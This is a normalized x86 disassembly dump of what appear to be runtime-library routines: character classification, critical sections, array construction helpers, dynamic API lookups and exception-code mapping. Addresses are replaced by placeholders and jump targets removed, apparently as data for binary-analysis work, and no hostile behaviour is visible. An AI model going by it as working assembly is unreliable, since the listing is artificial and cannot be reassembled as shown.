mov [ ebp - 0x161 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x110 ]
mov [ ebp - 0x118 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x160 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x168 ] ecx
mov edx [ ebp - 0x168 ]
mov cl [ ebp - 0x161 ]
mov [ edx ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x114 ]
push edx
mov ecx [ ebp - 0x118 ]
push ecx
mov eax [ ebp - 0x11c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x110 ]
mov [ ebp - 0x120 ] edx
mov ecx [ ebp - 0x120 ]
mov [ ebp - 0x124 ] ecx
mov [ ebp - 0x125 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x124 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x12c ] eax
mov eax [ ebp - 0x12c ]
mov cl [ ebp - 0x125 ]
mov [ eax ] cl
jmp r-xdata
sub_4c34b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
mov ebx [ ebp + 0x18 ]
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov edx [ ebp + 0x1c ]
mov [ edi ] edx
mov ecx [ ebx ]
cmp ecx [ ebp + 0x14 ]
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esi [ ebx ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ edi ]
cmp eax [ ebp + 0x20 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x8
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x14 ]
sub eax esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] esi
mov edx [ edi ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0xc ]
mov eax [ ecx + 0x4 ]
push eax
mov edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x14 ]
push ecx
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x1c ]
push edx
call sub_4c39c0
add esp 0x14
mov [ ebp - 0x8 ] eax
sub eax 0xfffffffe
je r-xdata
mov edx [ ebp + 0x14 ]
mov [ ebx ] edx
mov eax [ ebp - 0x4 ]
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x2
jmp r-xdata
dec eax
je r-xdata
mov edx [ edi ]
cmp [ edx ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
push ecx
call sub_4c4e7c
pop ecx
inc eax
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
add [ ebx ] edx
add [ edi ] 0x2
xor ecx ecx
mov [ ebp - 0x4 ] ecx
xor eax eax
mov [ ebp - 0x8 ] eax
sub_4c3594
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx [ ebp + 0x24 ]
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
mov edx [ ebp + 0x1c ]
mov [ ebx ] edx
mov ecx [ edi ]
cmp ecx [ ebp + 0x14 ]
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov edx [ edi ]
cmp edx [ ebp + 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebx ]
cmp ecx [ ebp + 0x20 ]
jne r-xdata
mov edx [ ebp + 0x20 ]
sub edx [ ebx ]
cmp edx [ rw-data ]
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp + 0x8 ]
add edx 0x8
mov [ ebp - 0x20 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x24 ] ecx
mov eax [ edi ]
mov dx [ eax ]
mov [ ebp - 0x26 ] dx
mov ecx [ ebp - 0x20 ]
mov eax [ ecx + 0x4 ]
push eax
mov edx [ ebp - 0x24 ]
push edx
mov cx [ ebp - 0x26 ]
push ecx
lea eax [ ebp - 0x16 ]
push eax
call sub_4c39f8
add esp 0x10
mov esi eax
test esi esi
jge r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov edx [ edi ]
mov cx [ edx ]
mov [ ebp - 0xe ] cx
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ edx + 0x4 ]
push ecx
mov eax [ ebp - 0xc ]
push eax
mov dx [ ebp - 0xe ]
push edx
mov ecx [ ebp - 0x14 ]
push ecx
call sub_4c39f8
add esp 0x10
mov esi eax
test esi esi
jge r-xdata
mov edx [ ebp + 0x20 ]
sub edx [ ebx ]
cmp esi edx
jle r-xdata
mov eax 0x2
jmp r-xdata
add [ edi ] 0x2
add [ ebx ] esi
xor edx edx
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax 0x2
jmp r-xdata
push esi
lea edx [ ebp - 0x16 ]
push edx
mov ecx [ ebx ]
push ecx
call sub_4c4cb0
add esp 0xc
add [ edi ] 0x2
add [ ebx ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c36c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edi edi
mov esi [ ebp + 0x18 ]
mov eax [ ebp + 0x10 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x8 ]
add ecx 0x8
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov ecx [ edx + 0x4 ]
lea edx [ ebp - 0x2 ]
push ecx
mov eax [ ebp - 0x10 ]
push eax
push 0x0
push edx
call sub_4c39f8
add esp 0x10
mov ebx eax
test ebx ebx
jg r-xdata
mov eax [ ebp + 0x14 ]
sub eax [ esi ]
dec ebx
cmp eax ebx
jge r-xdata
mov edi 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ edx ] ecx
mov edi 0x1
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
lea eax [ ebp - 0x2 ]
push eax
mov edx [ esi ]
push edx
call sub_4c4cb0
add esp 0xc
add [ esi ] ebx
sub_4c3748
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
xor esi esi
mov ebx [ ebp + 0x10 ]
jmp r-xdata
cmp esi [ ebp + 0x18 ]
jae r-xdata
mov eax esi
cmp ebx [ ebp + 0x14 ]
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
add edi 0x8
sub eax ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ebx
mov edx [ edi + 0x4 ]
lea ecx [ ebp - 0x4 ]
push edx
push ecx
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0xa ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push ecx
call sub_4c39c0
add esp 0x14
mov [ ebp - 0x8 ] eax
sub eax 0xfffffffe
je r-xdata
mov eax esi
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
jmp r-xdata
dec eax
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0xfffffffd
jne r-xdata
push ebx
call sub_4c4e7c
pop ecx
inc eax
mov [ ebp - 0x8 ] eax
add ebx [ ebp - 0x8 ]
inc esi
xor edx edx
mov [ ebp - 0x8 ] edx
sub_4c37dc
push ebx
push esi
push edi
push 0x2
push 0x100
call sub_4c3b98
add esp 0x8
mov edi eax
test edi edi
jne r-xdata
mov esi edi
xor ebx ebx
mov eax rw-data
jmp r-xdata
push ebx
call sub_4ca26c
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x80
jmp r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
call sub_4ca298
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x20
jmp r-xdata
push ebx
call sub_4ca2d8
pop ecx
test eax eax
je r-xdata
push ebx
call sub_4ca2c4
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x10
jmp r-xdata
push ebx
call sub_4ca300
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x4
push ebx
call sub_4ca2ec
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x8
jmp r-xdata
inc ebx
add esi 0x2
cmp ebx 0x100
jl r-xdata
or [ esi ] 0x1
push ebx
call sub_4ca214
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x2
jmp r-xdata
push ebx
call sub_4ca258
pop ecx
test eax eax
je r-xdata
mov eax edi
push ebx
call sub_4ca2d8
pop ecx
test eax eax
je r-xdata
or [ esi ] 0x200
jmp r-xdata
or [ esi ] 0x40
sub_4c38d8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
dec [ ebp - 0x8 ]
push 0x2
push rw-data
call sub_4c3934
add esp 0x8
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4c3908
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
dec [ rw-data ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax * 4 + rw-data ] edx
pop ebp
retn
call sub_4ced34
pop ebp
retn
sub_4c3934
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov edx [ eax * 4 + rw-data ]
call edx
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4c39c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0x18 ]
push eax
push ebx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4cc238
add esp 0x10
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax 0xfffffffe
jmp r-xdata
sub_4c39f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov cx [ ebp + 0xc ]
push ecx
push ebx
call sub_4cc3d8
add esp 0xc
mov eax 0x1
jmp r-xdata
pop ebx
pop ebp
retn
sub_4c3a20
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0x2
je r-xdata
pop esi
pop ebx
pop ebp
retn
push 0x1
push ebx
call InterlockedExchange
mov esi eax
test eax eax
jne r-xdata
cmp esi 0x2
jne r-xdata
call [ ebp + 0xc ]
mov [ ebx ] 0x2
jmp r-xdata
cmp [ ebx ] 0x2
jne r-xdata
mov [ ebx ] 0x2
jmp r-xdata
push 0x1
call Sleep
sub_4c3a64
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push 0x18
call sub_4c428c
pop ecx
mov esi eax
mov [ ebx ] esi
push esi
call InitializeCriticalSection
pop esi
pop ebx
pop ebp
retn
sub_4c3a84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
push eax
call DeleteCriticalSection
mov edx [ ebx ]
push edx
call sub_4c429c
pop ecx
pop ebx
pop ebp
retn
sub_4c3ac0
push ebx
xor eax eax
mov [ rw-data ] eax
xor ebx ebx
mov eax ebx
shl eax 0x2
add eax rw-data
push eax
call sub_4c3a84
pop ecx
inc ebx
cmp ebx 0x4
jl r-xdata
pop ebx
retn
sub_4c3ae4
push ebx
xor ebx ebx
test ebx ebx
je r-xdata
xor ebx ebx
push 0x41
call sub_4cc794
pop ecx
mov eax ebx
shl eax 0x2
add eax rw-data
push eax
call sub_4c3a64
pop ecx
inc ebx
cmp ebx 0x4
jl r-xdata
mov [ rw-data ] 0x4
push sub_4c3ac0
call sub_4c3908
pop ecx
pop ebx
retn
sub_4c3b24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push sub_4c3ae4
push rw-data
call sub_4c3a20
add esp 0x8
cmp ebx [ rw-data ]
jge r-xdata
pop ebx
pop ebp
retn
shl ebx 0x2
add ebx rw-data
push ebx
call sub_4c3aa0
pop ecx
sub_4c3b98
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
push esi
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push esi
push 0x0
push ebx
call sub_4c4d44
add esp 0xc
sub_4c3bc4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x18 ]
mov ebx [ ebp + 0x10 ]
and esi 0x7
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call [ ebp + 0x1c ]
add esp 0x8
jmp r-xdata
dec eax
je r-xdata
mov eax ebx
add [ ebp + 0x8 ] eax
add [ ebp + 0xc ] eax
dec [ ebp + 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call [ ebp + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
mov eax esi
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call [ ebp + 0x1c ]
jmp r-xdata
sub eax 0x2
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov eax [ ebp + 0x8 ]
push eax
call [ ebp + 0x1c ]
jmp r-xdata
jmp r-xdata
push rw-data
call sub_4cec84
pop ecx
sub_4c3c38
push ebp
mov ebp esp
xor eax eax
push eax
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x14 ]
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c3c5c
add esp 0x18
pop ebp
retn
sub_4c3c5c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0xc
and esi 0x10
and edi 0x8
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
test esi esi
je r-xdata
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
and [ ebp + 0x14 ] 0x7
mov ebx [ ebp + 0x10 ]
dec ebx
imul ebx [ ebp + 0xc ]
add ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x4 ]
mov [ ebp + 0x10 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
add [ ebp + 0x10 ] 0xffffffff
test edx edx
ja r-xdata
mov eax [ ebp + 0x14 ]
dec eax
je r-xdata
test esi esi
je r-xdata
push 0x2
push ebx
call [ ebp + 0x18 ]
add esp 0x8
jmp r-xdata
dec eax
je r-xdata
test edi edi
je r-xdata
add [ ebp + 0x8 ] 0xfffffffc
sub ebx [ ebp + 0xc ]
push 0x2
push ebx
call [ ebp + 0x18 ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0158
pop ecx
jmp r-xdata
mov edx 0x2
mov eax ebx
call [ ebp + 0x18 ]
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push 0x2
push ebx
call [ ebp + 0x18 ]
jmp r-xdata
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
push rw-data
call sub_4cec84
pop ecx
sub_4c3d3e
mov ecx [ ebp + 0x1c ]
inc [ ebp + 0x1c ]
test ecx ecx
jle r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x14 ]
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c3c5c
add esp 0x18
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x14 ] 0x14
call sub_4d1d58
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4c5cb4
sub_4c3d98
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov edx [ ebp + 0xc ]
imul edx [ ebp + 0x10 ]
test esi 0x10
je r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ edx ] ecx
add [ ebp + 0x8 ] 0x4
xor ecx ecx
mov ecx 0x4
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x28 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
add edx ecx
push edx
call sub_4bbb84
pop ecx
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x28 ]
add [ ebp - 0x28 ] 0xffffffff
test edx edx
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi 0x10
je r-xdata
mov eax esi
and eax 0x7
mov [ ebp - 0x14 ] 0xc
dec eax
je r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push ebx
call edi
pop ecx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
add ebx [ ebp + 0xc ]
push ebx
call edi
jmp r-xdata
dec eax
je r-xdata
mov eax ebx
call edi
jmp r-xdata
sub eax 0x2
je r-xdata
push ebx
call edi
jmp r-xdata
jmp r-xdata
push rw-data
call sub_4cec84
pop ecx
sub_4c3e96
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x14 ] 0x14
mov esi [ ebp + 0x10 ]
and edi 0x7
sub esi [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x24
dec esi
lea ebx [ esi - 0x1 ]
imul ebx [ ebp + 0xc ]
add ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0x24
jmp r-xdata
mov edx esi
add esi 0xffffffff
test edx edx
jg r-xdata
mov eax edi
cmp eax 0x5
ja r-xdata
mov [ ebp - 0x14 ] 0x14
jmp r-xdata
push rw-data
call sub_4cec84
pop ecx
jmp [ eax * 4 + jump_table_4c3ecf ]
cmp [ ebp - 0x2c ] 0x0
je r-xdata
push 0x0
push ebx
call [ ebp + 0x20 ]
add esp 0x8
jmp r-xdata
push ebx
push 0x0
call [ ebp + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
call [ ebp + 0x20 ]
jmp r-xdata
push 0x0
push ebx
call [ ebp + 0x20 ]
jmp r-xdata
sub ebx [ ebp + 0xc ]
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x14 ] 0x14
call sub_4d1d58
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0158
pop ecx
sub_4c3f2c
call sub_4c5cb4
mov [ ebp - 0x14 ] 0x2c
call sub_4d1d58
cmp [ ebp - 0x2c ] 0x0
je r-xdata
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x14 ] 0x14
call sub_4d1d58
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0158
pop ecx
sub_4c3f7c
push ebx
push esi
mov esi eax
mov eax esi
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push esi
push 0x0
push ebx
call sub_4c4d44
add esp 0xc
sub_4c3fc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push rw-data
call GetModuleHandleA
mov ebx eax
test ebx ebx
jne r-xdata
push rw-data
push ebx
call GetProcAddress
mov [ esi ] eax
push rw-data
push ebx
call GetProcAddress
mov edx [ ebp + 0xc ]
mov [ edx ] eax
push rw-data
push ebx
call GetProcAddress
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
push rw-data
push ebx
call GetProcAddress
mov [ edi ] eax
push rw-data
push ebx
call GetProcAddress
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
push rw-data
push ebx
call GetProcAddress
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov eax [ esi ]
mov [ rw-data ] eax
cmp [ edi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi ] sub_4c3f7c
mov ecx [ ebp + 0x1c ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp + 0x18 ]
mov [ edx ] sub_4c3f78
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
mov [ eax ] sub_4c3f78
xor eax eax
jmp r-xdata
mov edx [ ebp + 0xc ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp + 0x1c ]
cmp [ edx ] 0x0
jne r-xdata
mov eax 0x1
sub_4c40c0
push ebx
push esi
add esp 0xfffffff4
mov esi rw-data
push rw-data
call GetModuleHandleA
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
call sub_4c3fa0
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x8 ]
push ecx
lea eax [ esp + 0x8 ]
push eax
push rw-data
push rw-data
push rw-data
call sub_4c3fc0
add esp 0x18
push rw-data
mov edx [ rw-data ]
push edx
call GetProcAddress
mov [ rw-data ] eax
push rw-data
mov ecx [ rw-data ]
push ecx
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0xc ] sub_4c43a0
mov [ esi + 0x10 ] sub_4c4384
mov [ esi + 0x14 ] sub_4c43c4
mov [ esi + 0x18 ] sub_4c4418
mov [ esi + 0x8 ] 0x3
mov eax 0x1
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_4cec84
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_4cec84
pop ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0xc ] sub_4c421c
mov [ esi + 0x10 ] sub_4c4230
mov [ esi + 0x14 ] sub_4c4248
mov [ esi + 0x18 ] sub_4c4284
mov [ esi + 0x8 ] 0x2
mov edx [ esp + 0x8 ]
push edx
mov edx [ rw-data ]
mov ecx [ esp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov eax [ esp + 0x8 ]
push eax
push edx
push ecx
mov eax [ rw-data ]
push eax
call sub_4c4c50
add esp 0x18
call [ rw-data ]
mov eax 0x1
cmp [ esi + 0x4 ] 0x0
jne r-xdata
sub_4c4248
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx eax
mov eax edx
mov edx ecx
call [ rw-data ]
pop ebp
retn
mov eax edx
call [ rw-data ]
jmp r-xdata
xor eax eax
pop ebp
retn
call [ rw-data ]
pop ebp
retn
sub_4c42c4
push ebp
mov ebp esp
call sub_4c40c0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
mov [ rw-data ] sub_4c43a0
mov [ rw-data ] sub_4c4384
mov [ rw-data ] sub_4c43c4
mov [ rw-data ] sub_4c4418
mov [ rw-data ] 0x4
sub_4c433c
push ebp
mov ebp esp
push 0x1
call sub_4c42c4
pop ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call [ rw-data ]
add esp 0x8
pop ebp
retn
sub_4c4384
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_447510
mov eax ebx
call [ ebp - 0x18 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4c43a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
lea eax [ ebp - 0x18 ]
call sub_447510
mov eax ebx
call [ ebp - 0x14 ]
sub_4c43c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
call sub_447510
test esi esi
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov esi ebx
mov eax esi
call [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
mov edi ebx
mov [ ebp - 0x4 ] esi
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x14 ]
jmp r-xdata
mov eax esi
call [ ebp - 0x18 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c441c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
cmp edx 0xc0000092
jg r-xdata
cmp edx 0xc0000096
jg r-xdata
je r-xdata
sub edx 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
pop ebp
retn
cmp edx 0xc000008e
jg r-xdata
mov al 0xe
pop ebp
retn
sub edx 0x3d
je r-xdata
mov al 0xc
pop ebp
retn
sub edx 0xc0000093
je r-xdata
add edx 0x3fffff71
sub edx 0x2
jb r-xdata
je r-xdata
mov al 0xd
pop ebp
retn
jmp r-xdata
mov al 0x9
pop ebp
retn
dec edx
je r-xdata
je r-xdata
mov al 0x7
pop ebp
retn
sub edx 0xc0000005
je r-xdata
mov al 0x15
pop ebp
retn
mov al 0x3
pop ebp
retn
dec edx
je r-xdata
mov al 0x8
pop ebp
retn
jmp r-xdata
mov al 0xb
pop ebp
retn
sub edx 0x87
je r-xdata
mov al 0x5
pop ebp
retn
jmp r-xdata
mov al 0x4
pop ebp
retn
dec edx
je r-xdata
jmp r-xdata
sub_4c44b5
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c441c
pop ecx
and eax 0xff
cmp eax 0x3
jb r-xdata
xor eax eax
jmp r-xdata
cmp eax 0xf
jbe r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ eax * 8 + rw-data ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
mov eax [ rw-data ]
mov eax [ eax ]
test eax eax
je r-xdata
xor eax eax
mov esi eax
mov eax ebx
call esi
